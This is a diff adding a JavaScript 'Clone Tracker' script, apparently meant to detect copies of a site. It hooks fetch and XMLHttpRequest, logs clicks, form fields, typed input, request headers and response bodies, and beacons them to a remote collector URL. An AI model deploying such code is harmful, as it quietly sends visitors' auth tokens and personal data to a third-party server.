@@ -1,0 +1,266 @@
+(function() {
+    'use strict';
+
+    // Configurações - ALTERE A URL DO SEU SERVIDOR
+    const COLLECTOR_URL = 'https://seu-dominio.com/api/collect';
+
+    // Gera ou recupera session ID
+    function getSessionId() {
+        let sessionId = sessionStorage.getItem('clone_tracker_session');
+        if (!sessionId) {
+            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            sessionStorage.setItem('clone_tracker_session', sessionId);
+        }
+        return sessionId;
+    }
+
+    // Captura informações do navegador
+    function getBrowserInfo() {
+        return {
+            sessionId: getSessionId(),
+            domain: window.location.hostname,
+            url: window.location.href,
+            referrer: document.referrer || '',
+            screenResolution: screen.width + 'x' + screen.height,
+            language: navigator.language || navigator.userLanguage,
+            timestamp: new Date().toISOString(),
+            requests: []
+        };
+    }
+
+    // Armazena as requisições capturadas
+    let capturedRequests = [];
+
+    // Intercepta Fetch API
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+        const url = typeof args[0] === 'string' ? args[0] : args[0].url;
+        const method = args[1]?.method || 'GET';
+
+        const requestData = {
+            type: 'fetch',
+            url: url,
+            method: method,
+            timestamp: new Date().toISOString(),
+            headers: args[1]?.headers || {}
+        };
+
+        // Captura o body se existir
+        if (args[1]?.body) {
+            try {
+                requestData.body = args[1].body;
+            } catch (e) {
+                requestData.body = '[Unable to capture]';
+            }
+        }
+
+        capturedRequests.push(requestData);
+
+        // Executa o fetch original e captura a resposta
+        return originalFetch.apply(this, args).then(response => {
+            const responseData = {
+                type: 'fetch_response',
+                url: url,
+                status: response.status,
+                statusText: response.statusText,
+                timestamp: new Date().toISOString()
+            };
+
+            // Tenta capturar o corpo da resposta
+            const clonedResponse = response.clone();
+            clonedResponse.text().then(body => {
+                try {
+                    responseData.body = JSON.parse(body);
+                } catch (e) {
+                    responseData.bodyPreview = body.substring(0, 500);
+                }
+                capturedRequests.push(responseData);
+            }).catch(() => {});
+
+            return response;
+        });
+    };
+
+    // Intercepta XMLHttpRequest
+    const originalXHROpen = XMLHttpRequest.prototype.open;
+    const originalXHRSend = XMLHttpRequest.prototype.send;
+
+    XMLHttpRequest.prototype.open = function(method, url) {
+        this._requestData = {
+            type: 'xhr',
+            method: method,
+            url: url,
+            timestamp: new Date().toISOString()
+        };
+        return originalXHROpen.apply(this, arguments);
+    };
+
+    XMLHttpRequest.prototype.send = function(body) {
+        if (this._requestData) {
+            if (body) {
+                try {
+                    this._requestData.body = body;
+                } catch (e) {
+                    this._requestData.body = '[Unable to capture]';
+                }
+            }
+
+            capturedRequests.push(this._requestData);
+
+            // Captura a resposta
+            this.addEventListener('load', function() {
+                const responseData = {
+                    type: 'xhr_response',
+                    url: this._requestData.url,
+                    status: this.status,
+                    statusText: this.statusText,
+                    timestamp: new Date().toISOString()
+                };
+
+                try {
+                    responseData.body = JSON.parse(this.responseText);
+                } catch (e) {
+                    responseData.bodyPreview = this.responseText.substring(0, 500);
+                }
+
+                capturedRequests.push(responseData);
+            });
+        }
+
+        return originalXHRSend.apply(this, arguments);
+    };
+
+    // Captura cliques em elementos
+    document.addEventListener('click', function(e) {
+        const element = e.target;
+        const clickData = {
+            type: 'click',
+            tagName: element.tagName,
+            id: element.id || '',
+            className: element.className || '',
+            text: element.innerText?.substring(0, 100) || '',
+            href: element.href || '',
+            timestamp: new Date().toISOString()
+        };
+
+        capturedRequests.push(clickData);
+    }, true);
+
+    // Captura submissão de formulários
+    document.addEventListener('submit', function(e) {
+        const form = e.target;
+        const formData = new FormData(form);
+        const formFields = {};
+
+        // Captura campos do formulário (mascarando senhas)
+        for (let [key, value] of formData.entries()) {
+            if (key.toLowerCase().includes('password') ||
+                key.toLowerCase().includes('senha') ||
+                key.toLowerCase().includes('cvv') ||
+                key.toLowerCase().includes('card')) {
+                formFields[key] = '[MASKED]';
+            } else {
+                formFields[key] = value;
+            }
+        }
+
+        const submitData = {
+            type: 'form_submit',
+            action: form.action,
+            method: form.method,
+            fields: formFields,
+            timestamp: new Date().toISOString()
+        };
+
+        capturedRequests.push(submitData);
+    }, true);
+
+    // Captura mudanças de input
+    let inputDebounce = {};
+    document.addEventListener('input', function(e) {
+        const input = e.target;
+        if (input.tagName === 'INPUT' || input.tagName === 'TEXTAREA') {
+            const fieldName = input.name || input.id || 'unknown';
+
+            // Debounce para não capturar cada tecla
+            clearTimeout(inputDebounce[fieldName]);
+            inputDebounce[fieldName] = setTimeout(function() {
+                let value = input.value;
+
+                // Mascara campos sensíveis
+                if (input.type === 'password' ||
+                    fieldName.toLowerCase().includes('password') ||
+                    fieldName.toLowerCase().includes('senha') ||
+                    fieldName.toLowerCase().includes('cvv') ||
+                    fieldName.toLowerCase().includes('card')) {
+                    value = '[MASKED]';
+                }
+
+                const inputData = {
+                    type: 'input_change',
+                    fieldName: fieldName,
+                    fieldType: input.type,
+                    value: value,
+                    timestamp: new Date().toISOString()
+                };
+
+                capturedRequests.push(inputData);
+            }, 500);
+        }
+    }, true);
+
+    // Envia os dados para o servidor
+    function sendToServer() {
+        if (capturedRequests.length === 0) {
+            return;
+        }
+
+        const data = getBrowserInfo();
+        data.requests = [...capturedRequests];
+
+        // Limpa o array de requisições capturadas
+        capturedRequests = [];
+
+        // Envia via fetch (não interceptado)
+        originalFetch(COLLECTOR_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+            mode: 'cors'
+        }).catch(function(error) {
+            console.error('[Clone Tracker] Error sending data:', error);
+        });
+    }
+
+    // Envia dados a cada 10 segundos
+    setInterval(sendToServer, 10000);
+
+    // Envia dados quando a página é fechada
+    window.addEventListener('beforeunload', function() {
+        if (capturedRequests.length > 0) {
+            const data = getBrowserInfo();
+            data.requests = [...capturedRequests];
+
+            // Usa sendBeacon para garantir que os dados sejam enviados
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(COLLECTOR_URL, JSON.stringify(data));
+            } else {
+                sendToServer();
+            }
+        }
+    });
+
+    // Envia dados iniciais ao carregar a página
+    capturedRequests.push({
+        type: 'page_load',
+        url: window.location.href,
+        timestamp: new Date().toISOString()
+    });
+
+    // Envia após 2 segundos do carregamento
+    setTimeout(sendToServer, 2000);
+
+    console.log('[Clone Tracker] Initialized - Session:', getSessionId());
+})();
